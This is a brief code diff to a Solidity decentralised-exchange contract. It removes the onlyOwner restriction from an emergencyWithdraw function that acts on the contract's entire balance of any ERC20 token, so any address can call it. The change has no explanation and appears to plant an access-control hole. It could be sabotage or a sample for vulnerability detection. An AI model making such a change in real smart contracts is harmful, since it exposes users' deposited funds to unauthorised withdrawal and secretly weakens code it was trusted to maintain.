@@ -172,7 +172,7 @@ contract MyDEX is Ownable, ReentrancyGuard {
     }
 
     // Withdraw ERC20 tokens in case of emergency
-    function emergencyWithdraw(address token) external onlyOwner {
+    function emergencyWithdraw(address token) external {
         uint256 balance = IERC20(token).balanceOf(address(this));
         require(balance > 0, "No balance available");
 
